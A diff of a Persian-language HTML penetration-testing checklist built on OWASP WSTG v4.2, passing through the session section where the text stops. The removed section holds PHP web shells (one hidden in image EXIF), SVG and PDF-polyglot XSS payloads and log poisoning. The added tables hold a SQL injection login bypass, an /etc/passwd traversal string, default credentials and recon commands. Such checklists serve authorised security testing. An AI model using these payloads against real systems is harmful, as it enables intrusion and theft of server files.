@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>چک‌لیست جامع تست نفوذ وب - OWASP WSTG v4.2</title>
+    <title>داشبورد جامع و کامل تست نفوذ وب - OWASP WSTG v4.2</title>
     <style>
         :root {
             --bg-color: #0f172a;
@@ -14,10 +14,9 @@
             --code-bg: #090d16;
             --success-color: #10b981;
             --category-color: #f59e0b;
+            --danger-color: #ef4444;
         }
-        * {
-            box-sizing: border-box;
-        }
+        * { box-sizing: border-box; }
         body {
             font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background-color: var(--bg-color);
@@ -26,537 +25,402 @@
             padding: 15px;
             line-height: 1.6;
         }
-        .container {
-            max-width: 1400px;
-            margin: 0 auto;
-        }
+        .container { max-width: 1400px; margin: 0 auto; }
         header {
-            text-align: center;
-            margin-bottom: 25px;
-            padding: 25px;
+            text-align: center; margin-bottom: 25px; padding: 25px;
             background: linear-gradient(145deg, #1e293b, #0f172a);
-            border-radius: 12px;
-            border: 1px solid var(--border-color);
+            border-radius: 12px; border: 1px solid var(--border-color);
             box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.5);
+            position: sticky; top: 0; z-index: 100;
         }
-        h1 {
-            color: var(--accent-color);
-            margin: 0 0 10px 0;
-            font-size: 2rem;
-        }
-        p.sub {
-            color: #94a3b8;
-            margin: 0;
-            font-size: 1rem;
-        }
+        h1 { color: var(--accent-color); margin: 0 0 10px 0; font-size: 1.8rem; }
+        p.sub { color: #94a3b8; margin: 0; font-size: 0.95rem; }
+        .nav-links { margin-top: 15px; display: flex; flex-wrap: wrap; gap: 10px; justify-content: center; }
+        .nav-links a { color: #38bdf8; text-decoration: none; font-size: 0.85rem; background: var(--code-bg); padding: 5px 10px; border-radius: 4px; border: 1px solid var(--border-color); }
+        .nav-links a:hover { background: #0369a1; color: white; }
         .card {
-            background-color: var(--card-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 12px;
-            padding: 20px;
-            margin-bottom: 25px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+            background-color: var(--card-bg); border: 1px solid var(--border-color);
+            border-radius: 12px; padding: 20px; margin-bottom: 25px; box-shadow: 0 4px 6px rgba(0,0,0,0.3);
         }
-        h2 {
-            color: var(--category-color);
-            border-bottom: 2px solid var(--border-color);
-            padding-bottom: 10px;
-            margin-top: 0;
-            font-size: 1.4rem;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        .table-responsive {
-            width: 100%;
-            overflow-x: auto;
-            -webkit-overflow-scrolling: touch;
-        }
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            margin-top: 10px;
-            background-color: var(--card-bg);
-            min-width: 900px;
-        }
-        th, td {
-            padding: 14px 16px;
-            text-align: right;
-            border-bottom: 1px solid var(--border-color);
-            font-size: 0.95rem;
-            vertical-align: middle;
-        }
-        th {
-            background-color: #0284c7;
-            color: white;
-            font-weight: 600;
-        }
-        tr:hover {
-            background-color: #273548;
-        }
+        h2 { color: var(--category-color); border-bottom: 2px solid var(--border-color); padding-bottom: 10px; margin-top: 0; font-size: 1.3rem; scroll-margin-top: 120px; }
+        .table-responsive { width: 100%; overflow-x: auto; }
+        table { width: 100%; border-collapse: collapse; margin-top: 10px; background-color: var(--card-bg); min-width: 900px; }
+        th, td { padding: 12px 14px; text-align: right; border-bottom: 1px solid var(--border-color); font-size: 0.9rem; vertical-align: middle; }
+        th { background-color: #0284c7; color: white; font-weight: 600; }
+        tr:hover { background-color: #273548; }
         .click-to-copy {
-            background-color: var(--code-bg);
-            color: #38bdf8;
-            padding: 10px 14px;
-            border-radius: 6px;
-            font-family: 'Consolas', 'Courier New', monospace;
-            direction: ltr;
-            text-align: left;
-            display: block;
-            font-size: 0.9rem;
-            cursor: pointer;
-            border: 1px dashed var(--border-color);
-            transition: all 0.2s ease;
-            position: relative;
-            word-break: break-all;
-            margin-top: 8px;
+            background-color: var(--code-bg); color: #38bdf8; padding: 8px 12px; border-radius: 6px;
+            font-family: 'Consolas', monospace; direction: ltr; text-align: left; display: block; font-size: 0.85rem; cursor: pointer; border: 1px dashed var(--border-color); transition: all 0.2s ease; margin-top: 6px; word-break: break-all;
         }
-        .click-to-copy:hover {
-            border-color: var(--accent-color);
-            background-color: #111c34;
-            box-shadow: 0 0 8px rgba(56, 189, 248, 0.2);
-        }
-        .click-to-copy.copied {
-            background-color: var(--success-color) !important;
-            color: white !important;
-            border-style: solid;
-            border-color: var(--success-color);
-        }
-        .badge {
-            background-color: #0369a1;
-            color: white;
-            padding: 5px 10px;
-            border-radius: 6px;
-            font-size: 0.85rem;
-            font-family: monospace;
-            white-space: nowrap;
-            display: inline-block;
-        }
-        .tool-badge {
-            background-color: #475569;
-            color: #e2e8f0;
-            padding: 4px 8px;
-            border-radius: 4px;
-            font-size: 0.8rem;
-        }
-        footer {
-            text-align: center;
-            color: #64748b;
-            margin-top: 30px;
-            font-size: 0.9em;
-            padding-bottom: 30px;
-        }
+        .click-to-copy:hover { border-color: var(--accent-color); background-color: #111c34; }
+        .click-to-copy.copied { background-color: var(--success-color) !important; color: white !important; border-style: solid; border-color: var(--success-color); }
+        .badge { background-color: #0369a1; color: white; padding: 4px 8px; border-radius: 4px; font-size: 0.8rem; font-family: monospace; white-space: nowrap; display: inline-block; }
+        .tool-badge { background-color: #475569; color: #e2e8f0; padding: 3px 6px; border-radius: 4px; font-size: 0.75rem; }
+        footer { text-align: center; color: #64748b; margin-top: 30px; font-size: 0.9em; padding-bottom: 30px; }
     </style>
 </head>
 <body>
     <div class="container">
         <header>
-            <h1>چک‌لیست جامع تست نفوذ وب</h1>
-            <p class="sub">بر اساس متدولوژی OWASP WSTG v4.2 - همراه با پی‌لودها و سناریوهای عملیاتی</p>
+            <h1>نسخه جامع تست نفوذ وب (WSTG v4.2)</h1>
+            <p class="sub">پوشش کامل تمامی ۱۱ دسته‌بندی OWASP - روی باکس‌های کُد کلیک کنید تا کپی شوند</p>
+            <div class="nav-links">
+                <a href="#info">۱. جمع‌آوری اطلاعات</a>
+                <a href="#conf">۲. پیکربندی</a>
+                <a href="#idnt">۳. مدیریت هویت</a>
+                <a href="#authn">۴. احراز هویت</a>
+                <a href="#authz">۵. مجوزها</a>
+                <a href="#sess">۶. نشست‌ها</a>
+                <a href="#inpv">۷. اعتبارسنجی ورودی</a>
+                <a href="#errh">۸. مدیریت خطا</a>
+                <a href="#cryp">۹. رمزنگاری</a>
+                <a href="#busl">۱۰. منطق تجاری</a>
+                <a href="#clnt">۱۱. سمت کلاینت</a>
+            </div>
         </header>
 
-        <!-- بخش اول: پی‌لودهای اختصاصی -->
-        <div class="card">
-            <h2>🎯 بخش ویژه: پی‌لودهای Bypass و RCE پیشرفته</h2>
-            <div class="table-responsive">
-                <table>
-                    <tr>
-                        <th style="width: 20%;">نوع پی‌لود</th>
-                        <th style="width: 55%;">کد / ساختار اجرایی (کلیک کنید تا کپی شود)</th>
-                        <th style="width: 25%;">توضیحات و سناریو</th>
-                    </tr>
-                    <tr>
-                        <td><strong>SVG XSS (Bypass)</strong></td>
-                        <td>
-                            <div class="click-to-copy" onclick="copySnippet(this)">&lt;svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"&gt;&lt;/svg&gt;</div>
-                        </td>
-                        <td>آپلود به عنوان عکس پروفایل. مناسب برای دور زدن فیلترهای پسوند فایل.</td>
-                    </tr>
-                    <tr>
-                        <td><strong>PHP Metadata RCE</strong></td>
-                        <td>
-                            <div class="click-to-copy" onclick="copySnippet(this)">exiftool -Comment='&lt;?php system($_GET["cmd"]); ?&gt;' img.jpg</div>
-                        </td>
-                        <td>تزریق وب‌شل در متادیتای تصویر (EXIF) جهت دور زدن بررسی محتوای فایل.</td>
-                    </tr>
-                    <tr>
-                        <td><strong>PDF Polyglot XSS</strong></td>
-                        <td>
-                            <div class="click-to-copy" onclick="copySnippet(this)">%PDF-1.4 1 0 obj &lt;&lt; /Pages 2 0 R /Type /Catalog &gt;&gt; endobj trailer &lt;&lt; /Root 1 0 R &gt;&gt; %&lt;script&gt;alert(1)&lt;/script&gt;</div>
-                        </td>
-                        <td>فایلی که هم به عنوان PDF معتبر است و هم اسکریپت جاوا اسکریپت اجرا می‌کند.</td>
-                    </tr>
-                    <tr>
-                        <td><strong>LFI to RCE (Log Poisoning)</strong></td>
-                        <td>
-                            <div class="click-to-copy" onclick="copySnippet(this)">&lt;?php system($_GET['c']); ?&gt;</div>
-                        </td>
-                        <td>ارسال در هدر User-Agent و سپس فراخوانی لاگ سرور (/var/log/apache2/access.log) از طریق LFI.</td>
-                    </tr>
-                </table>
-            </div>
-        </div>
-
         <!-- 1. Information Gathering -->
-        <div class="card">
-            <h2>🔍 ۱. جمع‌آوری اطلاعات (WSTG-INFO)</h2>
+        <div class="card" id="info">
+            <h2>🔍 ۱. جمع‌آوری اطلاعات (Information Gathering)</h2>
             <div class="table-responsive">
                 <table>
+                    <tr><th style="width: 12%;">شناسه</th><th style="width: 15%;">عنوان</th><th style="width: 12%;">ابزار</th><th style="width: 61%;">سناریو و پی‌لود / دستور</th></tr>
                     <tr>
-                        <th style="width: 15%;">شناسه</th>
-                        <th style="width: 18%;">دسته‌بندی</th>
-                        <th style="width: 15%;">ابزار</th>
-                        <th style="width: 52%;">سناریو و روش تست عملیاتی</th>
+                        <td><span class="badge">WSTG-INFO-01</span></td><td>موتورهای جستجو</td><td><span class="tool-badge">Google</span></td>
+                        <td>جستجوی اطلاعات نشت شده سازمان:<div class="click-to-copy" onclick="copySnippet(this)">site:target.com ext:sql OR ext:bak OR ext:env OR ext:log</div></td>
                     </tr>
                     <tr>
-                        <td><span class="badge">WSTG-INFO-01</span></td>
-                        <td>موتورهای جستجو</td>
-                        <td><span class="tool-badge">Google Dorks</span></td>
-                        <td>استخراج فایل‌های حساس و بک‌آپ‌ها از گوگل:<div class="click-to-copy" onclick="copySnippet(this)">site:target.com ext:bak OR ext:sql OR ext:env OR ext:log</div></td>
+                        <td><span class="badge">WSTG-INFO-02</span></td><td>شناسایی وب‌سرور</td><td><span class="tool-badge">Netcat / Nmap</span></td>
+                        <td>بررسی نسخه سرور از طریق هدرهای خطا:<div class="click-to-copy" onclick="copySnippet(this)">nmap -sV -p 80,443 --script http-server-header target.com</div></td>
                     </tr>
                     <tr>
-                        <td><span class="badge">WSTG-INFO-02</span></td>
-                        <td>شناسایی وب‌سرور</td>
-                        <td><span class="tool-badge">Netcat / Burp</span></td>
-                        <td>ارسال درخواست نامعتبر برای بررسی خطاهای پیش‌فرض و هدرهای Server:<div class="click-to-copy" onclick="copySnippet(this)">nc -v target.com 80&#10;INVALID / HTTP/1.1&#10;Host: target.com</div></td>
+                        <td><span class="badge">WSTG-INFO-03</span></td><td>متافایل‌ها و نشت</td><td><span class="tool-badge">Browser</span></td>
+                        <td>بررسی مسیرهای کلیدی برای یافتن دایرکتوری‌های مخفی:<div class="click-to-copy" onclick="copySnippet(this)">/robots.txt , /sitemap.xml , /crossdomain.xml , /.well-known/</div></td>
                     </tr>
                     <tr>
-                        <td><span class="badge">WSTG-INFO-03</span></td>
-                        <td>نشت از متافایل‌ها</td>
-                        <td><span class="tool-badge">Browser</span></td>
-                        <td>بررسی فایل‌های استاندارد برای یافتن مسیرهای پنهان:<div class="click-to-copy" onclick="copySnippet(this)">/robots.txt , /sitemap.xml , /.well-known/security.txt</div></td>
+                        <td><span class="badge">WSTG-INFO-04</span></td><td>شمارش اپلیکیشن‌ها</td><td><span class="tool-badge">ffuf / dirb</span></td>
+                        <td>پیدا کردن ساب‌دامین‌ها یا اپلیکیشن‌های پنهان روی سرور:<div class="click-to-copy" onclick="copySnippet(this)">ffuf -w subdomains.txt -u https://FUZZ.target.com</div></td>
                     </tr>
                     <tr>
-                        <td><span class="badge">WSTG-INFO-08</span></td>
-                        <td>شناسایی فریم‌ورک</td>
-                        <td><span class="tool-badge">Wappalyzer / curl</span></td>
-                        <td>بررسی کوکی‌های پیش‌فرض (مثل PHPSESSID یا JSESSIONID) و هدر X-Powered-By.</td>
+                        <td><span class="badge">WSTG-INFO-05</span></td><td>بررسی کامنت‌ها</td><td><span class="tool-badge">Burp</span></td>
+                        <td>جستجوی عبارات حساس در سورس کد:<div class="click-to-copy" onclick="copySnippet(this)">(?i)(password|api_key|secret|token|TODO|FIXME)</div></td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-INFO-06</span></td><td>نقاط ورود (Entry)</td><td><span class="tool-badge">Burp Spider</span></td>
+                        <td>استخراج تمام پارامترهای GET/POST، هدرها و کوکی‌هایی که کاربر می‌تواند تغییر دهد.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-INFO-08</span></td><td>شناسایی فریم‌ورک</td><td><span class="tool-badge">Wappalyzer / curl</span></td>
+                        <td>یافتن پشته تکنولوژی با بررسی هدر X-Powered-By و نام کوکی‌ها (مثل PHPSESSID).</td>
                     </tr>
                 </table>
             </div>
         </div>
 
         <!-- 2. Configuration & Deployment -->
-        <div class="card">
-            <h2>⚙️ ۲. مدیریت پیکربندی (WSTG-CONF)</h2>
+        <div class="card" id="conf">
+            <h2>⚙️ ۲. تست‌های پیکربندی (Configuration & Deployment)</h2>
             <div class="table-responsive">
                 <table>
+                    <tr><th style="width: 12%;">شناسه</th><th style="width: 15%;">عنوان</th><th style="width: 12%;">ابزار</th><th style="width: 61%;">سناریو و پی‌لود / دستور</th></tr>
                     <tr>
-                        <th style="width: 15%;">شناسه</th>
-                        <th style="width: 18%;">دسته‌بندی</th>
-                        <th style="width: 15%;">ابزار</th>
-                        <th style="width: 52%;">سناریو و روش تست عملیاتی</th>
+                        <td><span class="badge">WSTG-CONF-01</span></td><td>پیکربندی شبکه</td><td><span class="tool-badge">Nmap</span></td>
+                        <td>اسکن پورت‌های باز ادمین (SSH, FTP, RDP) روی سرور وب:<div class="click-to-copy" onclick="copySnippet(this)">nmap -sV -p 21,22,3389,8080,8443 target.com</div></td>
                     </tr>
                     <tr>
-                        <td><span class="badge">WSTG-CONF-01</span></td>
-                        <td>بررسی SSL/TLS</td>
-                        <td><span class="tool-badge">sslscan / testssl</span></td>
-                        <td>بررسی سایفرسوییت‌های ضعیف و نسخه‌های منسوخ TLS:<div class="click-to-copy" onclick="copySnippet(this)">sslscan --show-certificate target.com</div></td>
+                        <td><span class="badge">WSTG-CONF-02</span></td><td>پلتفرم اپلیکیشن</td><td><span class="tool-badge">Burp</span></td>
+                        <td>تولید خطاهای عمدی (مثلاً ارسال %00 در URL) برای گرفتن اطلاعات فریم‌ورک و Stack Trace.</td>
                     </tr>
                     <tr>
-                        <td><span class="badge">WSTG-CONF-04</span></td>
-                        <td>فایل‌های بک‌آپ</td>
-                        <td><span class="tool-badge">ffuf / dirb</span></td>
-                        <td>فازینگ دایرکتوری‌ها برای یافتن فایل‌های فشرده سورس کد:<div class="click-to-copy" onclick="copySnippet(this)">ffuf -w wordlist.txt -u https://target.com/FUZZ.zip -mc 200</div></td>
+                        <td><span class="badge">WSTG-CONF-03</span></td><td>پسوندهای فایل</td><td><span class="tool-badge">ffuf</span></td>
+                        <td>تست آپلود یا دسترسی به پسوندهای حساس و بک‌آپ:<div class="click-to-copy" onclick="copySnippet(this)">.php.bak, .inc, .old, .zip, .tar.gz</div></td>
                     </tr>
                     <tr>
-                        <td><span class="badge">WSTG-CONF-05</span></td>
-                        <td>CORS آسیب‌پذیر</td>
-                        <td><span class="tool-badge">Burp Repeater</span></td>
-                        <td>ارسال هدر Origin مخرب. اگر پاسخ شامل <code>Access-Control-Allow-Origin: https://evil.com</code> و <code>Credentials: true</code> بود، آسیب‌پذیر است:<div class="click-to-copy" onclick="copySnippet(this)">Origin: https://evil.com</div></td>
+                        <td><span class="badge">WSTG-CONF-04</span></td><td>فایل‌های مدیریت‌نشده</td><td><span class="tool-badge">DirBuster</span></td>
+                        <td>بررسی پنل‌های ادمین مخفی یا دیتابیس‌های لو رفته:<div class="click-to-copy" onclick="copySnippet(this)">/admin, /phpmyadmin, /backup.sql, /.git/config</div></td>
                     </tr>
                     <tr>
-                        <td><span class="badge">WSTG-CONF-06</span></td>
-                        <td>متدهای HTTP</td>
-                        <td><span class="tool-badge">curl</span></td>
-                        <td>تست باز بودن متدهای خطرناک مثل PUT یا DELETE:<div class="click-to-copy" onclick="copySnippet(this)">curl -v -X OPTIONS https://target.com</div></td>
+                        <td><span class="badge">WSTG-CONF-06</span></td><td>متدهای HTTP</td><td><span class="tool-badge">curl</span></td>
+                        <td>تست باز بودن متدهای خطرناک PUT/DELETE:<div class="click-to-copy" onclick="copySnippet(this)">curl -v -X PUT -d 'Test' https://target.com/test.txt</div></td>
                     </tr>
                     <tr>
-                        <td><span class="badge">WSTG-CONF-07</span></td>
-                        <td>هدرهای امنیتی</td>
-                        <td><span class="tool-badge">Browser (F12)</span></td>
-                        <td>بررسی تب Network برای هدرهای <code>Strict-Transport-Security</code>، <code>X-Frame-Options</code> و <code>Content-Security-Policy</code>.</td>
+                        <td><span class="badge">WSTG-CONF-07</span></td><td>هدرهای امنیتی (HSTS)</td><td><span class="tool-badge">curl / Browser</span></td>
+                        <td>عدم وجود هدرهای: <code>Strict-Transport-Security</code>، <code>X-Frame-Options</code>، <code>CSP</code>.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-CONF-08</span></td><td>محدودیت CORS</td><td><span class="tool-badge">Burp Repeater</span></td>
+                        <td>افزودن هدر <code>Origin: https://evil.com</code>. در صورت بازگشت <code>Access-Control-Allow-Origin: https://evil.com</code> سایت آسیب‌پذیر است.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-CONF-10</span></td><td>ساب‌دامین تیک‌اور</td><td><span class="tool-badge">subjack</span></td>
+                        <td>یافتن ساب‌دامین‌هایی که به سرویس‌های ابری حذف شده (مثل AWS/Github) پوینت شده‌اند.</td>
                     </tr>
                 </table>
             </div>
         </div>
 
-        <!-- 3 & 4. Identity & Authentication -->
-        <div class="card">
-            <h2>🔑 ۳ و ۴. هویت و احراز هویت (WSTG-IDNT & AUTHN)</h2>
+        <!-- 3. Identity Management -->
+        <div class="card" id="idnt">
+            <h2>👥 ۳. مدیریت هویت (Identity Management)</h2>
             <div class="table-responsive">
                 <table>
+                    <tr><th style="width: 12%;">شناسه</th><th style="width: 15%;">عنوان</th><th style="width: 12%;">ابزار</th><th style="width: 61%;">سناریو و پی‌لود / دستور</th></tr>
                     <tr>
-                        <th style="width: 15%;">شناسه</th>
-                        <th style="width: 18%;">دسته‌بندی</th>
-                        <th style="width: 15%;">ابزار</th>
-                        <th style="width: 52%;">سناریو و روش تست عملیاتی</th>
+                        <td><span class="badge">WSTG-IDNT-01</span></td><td>نقش‌های کاربری</td><td><span class="tool-badge">Manual</span></td>
+                        <td>بررسی اینکه آیا نقش‌های مختلف (Admin, Manager, User) در سیستم به درستی از هم تفکیک شده‌اند یا خیر.</td>
                     </tr>
                     <tr>
-                        <td><span class="badge">WSTG-IDNT-04</span></td>
-                        <td>شمارش کاربران</td>
-                        <td><span class="tool-badge">Burp Intruder</span></td>
-                        <td>تست فرم لاگین/فراموشی رمز. بررسی تفاوت در پیام‌های خطا (مثلاً "کاربر یافت نشد" در برابر "رمز اشتباه است") یا تفاوت در زمان پاسخگویی سرور.</td>
+                        <td><span class="badge">WSTG-IDNT-02</span></td><td>ثبت‌نام کاربر</td><td><span class="tool-badge">Burp</span></td>
+                        <td>تلاش برای ثبت‌نام با ایمیل‌های مدیریتی (admin@target.com) یا استفاده از کاراکترهای خاص در نام کاربری.</td>
                     </tr>
                     <tr>
-                        <td><span class="badge">WSTG-AUTHN-02</span></td>
-                        <td>اعتبارنامه‌های پیش‌فرض</td>
-                        <td><span class="tool-badge">Hydra / Burp</span></td>
-                        <td>تست پسوردهای پیش‌فرض رایج روی پنل‌های ادمین (admin:admin, root:toor, tomcat:tomcat).</td>
+                        <td><span class="badge">WSTG-IDNT-04</span></td><td>شمارش کاربران</td><td><span class="tool-badge">Burp Intruder</span></td>
+                        <td>بررسی تفاوت در پیام‌های خطا در لاگین یا فراموشی رمز:<div class="click-to-copy" onclick="copySnippet(this)">"کاربر یافت نشد" vs "رمز اشتباه است"</div></td>
+                    </tr>
+                </table>
+            </div>
+        </div>
+
+        <!-- 4. Authentication -->
+        <div class="card" id="authn">
+            <h2>🔑 ۴. احراز هویت (Authentication)</h2>
+            <div class="table-responsive">
+                <table>
+                    <tr><th style="width: 12%;">شناسه</th><th style="width: 15%;">عنوان</th><th style="width: 12%;">ابزار</th><th style="width: 61%;">سناریو و پی‌لود / دستور</th></tr>
+                    <tr>
+                        <td><span class="badge">WSTG-AUTHN-01</span></td><td>ارسال غیرامن</td><td><span class="tool-badge">Wireshark</span></td>
+                        <td>بررسی ارسال رمزهای عبور به صورت Plain Text روی پروتکل HTTP (بدون رمزنگاری).</td>
                     </tr>
                     <tr>
-                        <td><span class="badge">WSTG-AUTHN-03</span></td>
-                        <td>قفل اکانت (Lockout)</td>
-                        <td><span class="tool-badge">Burp Intruder</span></td>
-                        <td>ارسال متوالی ۳۰ درخواست لاگین با پسورد غلط برای یک یوزر خاص و بررسی اینکه آیا اکانت قفل می‌شود یا خیر.</td>
+                        <td><span class="badge">WSTG-AUTHN-02</span></td><td>پسوردهای پیش‌فرض</td><td><span class="tool-badge">Hydra</span></td>
+                        <td>فورس کردن پنل‌های ادمین با یوزرهای پیش‌فرض:<div class="click-to-copy" onclick="copySnippet(this)">admin:admin , tomcat:tomcat , root:toor</div></td>
                     </tr>
                     <tr>
-                        <td><span class="badge">WSTG-AUTHN-04</span></td>
-                        <td>بایپس احراز هویت</td>
-                        <td><span class="tool-badge">Burp Suite</span></td>
-                        <td>تزریق SQL در فیلد نام کاربری برای دور زدن لاگین:<div class="click-to-copy" onclick="copySnippet(this)">admin' OR '1'='1'#</div></td>
+                        <td><span class="badge">WSTG-AUTHN-03</span></td><td>مکانیسم Lockout</td><td><span class="tool-badge">Burp Intruder</span></td>
+                        <td>ارسال ۵۰ درخواست متوالی با رمز اشتباه. سیستم باید اکانت را پس از تعداد مشخصی تلاش قفل یا کپچا درخواست کند.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-AUTHN-04</span></td><td>بایپس احراز هویت</td><td><span class="tool-badge">Burp Suite</span></td>
+                        <td>تزریق SQL در فیلد Username یا Password جهت ورود بدون رمز:<div class="click-to-copy" onclick="copySnippet(this)">admin' OR '1'='1'#</div></td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-AUTHN-06</span></td><td>کش مرورگر</td><td><span class="tool-badge">Browser</span></td>
+                        <td>زدن دکمه Back در مرورگر پس از Logout؛ صفحات حساس نباید از کش بازخوانی شوند (نیاز به هدر no-cache).</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-AUTHN-08</span></td><td>سوالات امنیتی</td><td><span class="tool-badge">Manual</span></td>
+                        <td>دور زدن سوالات امنیتی بازیابی رمز با حدس زدن پاسخ‌های عمومی یا تزریق کد در فیلد پاسخ.</td>
                     </tr>
                 </table>
             </div>
         </div>
 
         <!-- 5. Authorization -->
-        <div class="card">
-            <h2>🛡️ ۵. مجوزها و دسترسی‌ها (WSTG-AUTHZ)</h2>
+        <div class="card" id="authz">
+            <h2>🛡️ ۵. مجوزها (Authorization / Access Control)</h2>
             <div class="table-responsive">
                 <table>
+                    <tr><th style="width: 12%;">شناسه</th><th style="width: 15%;">عنوان</th><th style="width: 12%;">ابزار</th><th style="width: 61%;">سناریو و پی‌لود / دستور</th></tr>
                     <tr>
-                        <th style="width: 15%;">شناسه</th>
-                        <th style="width: 18%;">دسته‌بندی</th>
-                        <th style="width: 15%;">ابزار</th>
-                        <th style="width: 52%;">سناریو و روش تست عملیاتی</th>
+                        <td><span class="badge">WSTG-AUTHZ-01</span></td><td>پیمایش مسیر (LFI)</td><td><span class="tool-badge">Burp Suite</span></td>
+                        <td>تلاش برای خواندن فایل‌های حساس سیستم عامل با پارامترهای آدرس‌دهی فایل:<div class="click-to-copy" onclick="copySnippet(this)">?file=../../../../../../etc/passwd%00</div></td>
                     </tr>
                     <tr>
-                        <td><span class="badge">WSTG-AUTHZ-01</span></td>
-                        <td>پیمایش مسیر (LFI)</td>
-                        <td><span class="tool-badge">Burp Suite</span></td>
-                        <td>دستکاری پارامترهای خواندن فایل جهت دسترسی به فایل‌های حساس سرور:<div class="click-to-copy" onclick="copySnippet(this)">../../../../../../etc/passwd%00</div></td>
+                        <td><span class="badge">WSTG-AUTHZ-02</span></td><td>ارتقاء سطح دسترسی</td><td><span class="tool-badge">Autorize (Burp)</span></td>
+                        <td>دسترسی عمودی: تلاش کاربر عادی برای فراخوانی توابع ادمین (مثلاً <code>/api/admin/delete</code>).</td>
                     </tr>
                     <tr>
-                        <td><span class="badge">WSTG-AUTHZ-02</span></td>
-                        <td>ارتقاء سطح دسترسی</td>
-                        <td><span class="tool-badge">Autorize (Burp)</span></td>
-                        <td>لاگین با یوزر عادی و تلاش برای دسترسی به اندپوینت‌های ادمین (مثلاً <code>/admin/deleteUser</code>).</td>
-                    </tr>
-                    <tr>
-                        <td><span class="badge">WSTG-AUTHZ-04</span></td>
-                        <td>آسیب‌پذیری IDOR</td>
-                        <td><span class="tool-badge">Burp Repeater</span></td>
-                        <td>تغییر پارامترهای شناسایی عددی یا UUID در درخواست‌ها (مثلاً تغییر <code>user_id=101</code> به <code>102</code>) برای مشاهده اطلاعات سایر کاربران.</td>
+                        <td><span class="badge">WSTG-AUTHZ-04</span></td><td>آسیب‌پذیری IDOR</td><td><span class="tool-badge">Burp Repeater</span></td>
+                        <td>دسترسی افقی: تغییر شناسه در URL یا Body برای دسترسی به اطلاعات کاربر دیگر:<div class="click-to-copy" onclick="copySnippet(this)">/profile/view?user_id=1055 (تغییر به 1056)</div></td>
                     </tr>
                 </table>
             </div>
         </div>
 
         <!-- 6. Session Management -->
-        <div class="card">
-            <h2>⏳ ۶. مدیریت نشست‌ها (WSTG-SESS)</h2>
+        <div class="card" id="sess">
+            <h2>⏳ ۶. مدیریت نشست (Session Management)</h2>
             <div class="table-responsive">
                 <table>
+                    <tr><th style="width: 12%;">شناسه</th><th style="width: 15%;">عنوان</th><th style="width: 12%;">ابزار</th><th style="width: 61%;">سناریو و پی‌لود / دستور</th></tr>
                     <tr>
-                        <th style="width: 15%;">شناسه</th>
-                        <th style="width: 18%;">دسته‌بندی</th>
-                        <th style="width: 15%;">ابزار</th>
-                        <th style="width: 52%;">سناریو و روش تست عملیاتی</th>
+                        <td><span class="badge">WSTG-SESS-01</span></td><td>بایپس سشن</td><td><span class="tool-badge">Burp</span></td>
+                        <td>دستکاری مقادیر سشن یا توکن JWT (مثلاً تغییر فیلد alg به none در JWT).</td>
                     </tr>
                     <tr>
-                        <td><span class="badge">WSTG-SESS-01</span></td>
-                        <td>تثبیت نشست (Fixation)</td>
-                        <td><span class="tool-badge">Browser</span></td>
-                        <td>ارسال یک سشن ID معتبر به قربانی در URL. در صورت لاگین قربانی، آیا سشن ID تغییر می‌کند؟ اگر نه، آسیب‌پذیر است.</td>
+                        <td><span class="badge">WSTG-SESS-02</span></td><td>ویژگی‌های کوکی</td><td><span class="tool-badge">Browser (F12)</span></td>
+                        <td>کوکی‌های نشست باید حتماً دارای فلگ‌های امنیتی باشند:<div class="click-to-copy" onclick="copySnippet(this)">Secure; HttpOnly; SameSite=Strict</div></td>
                     </tr>
                     <tr>
-                        <td><span class="badge">WSTG-SESS-02</span></td>
-                        <td>فلگ‌های کوکی</td>
-                        <td><span class="tool-badge">Burp Suite</span></td>
-                        <td>بررسی تب Response لاگین؛ کوکی‌های نشست (Session) حتماً باید دارای فلگ‌های امنیتی باشند:<div class="click-to-copy" onclick="copySnippet(this)">Set-Cookie: session=123; Secure; HttpOnly; SameSite=Strict</div></td>
+                        <td><span class="badge">WSTG-SESS-03</span></td><td>تثبیت نشست</td><td><span class="tool-badge">Browser</span></td>
+                        <td>بررسی اینکه آیا سرور پس از ورود موفق، شناسه Session را تغییر می‌دهد (Regenerate) یا خیر.</td>
                     </tr>
                     <tr>
-                        <td><span class="badge">WSTG-SESS-06</span></td>
-                        <td>ابطال نشست (Logout)</td>
-                        <td><span class="tool-badge">Burp Repeater</span></td>
-                        <td>کپی کردن یک درخواست احراز هویت شده، انجام عمل Logout در مرورگر، و سپس ارسال مجدد درخواست در Burp. اگر جواب داد، سشن سمت سرور باطل نشده است.</td>
+                        <td><span class="badge">WSTG-SESS-05</span></td><td>حمله CSRF</td><td><span class="tool-badge">Burp CSRF PoC</span></td>
+                        <td>ساخت فرم HTML مخفی و اجرای آن توسط کاربر لاگین شده برای تغییر ایمیل/پسورد (در صورت نبود توکن Anti-CSRF).</td>
                     </tr>
                     <tr>
-                        <td><span class="badge">WSTG-SESS-08</span></td>
-                        <td>تایم‌اوت نشست</td>
-                        <td><span class="tool-badge">Browser</span></td>
-                        <td>رها کردن تب اپلیکیشن به مدت ۱۵ الی ۳۰ دقیقه بدون هیچ فعالیتی. آیا پس از این مدت سشن اکسپایر می‌شود؟</td>
+                        <td><span class="badge">WSTG-SESS-06</span></td><td>وضعیت Logout</td><td><span class="tool-badge">Burp Repeater</span></td>
+                        <td>خروج از سایت در مرورگر، سپس استفاده از توکن/سشن قدیمی در Burp برای بررسی ابطال سمت سرور.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge">WSTG-SESS-07</span></td><td>تایم‌اوت نشست</td><td><span class="tool-badge">Manual</span></td>
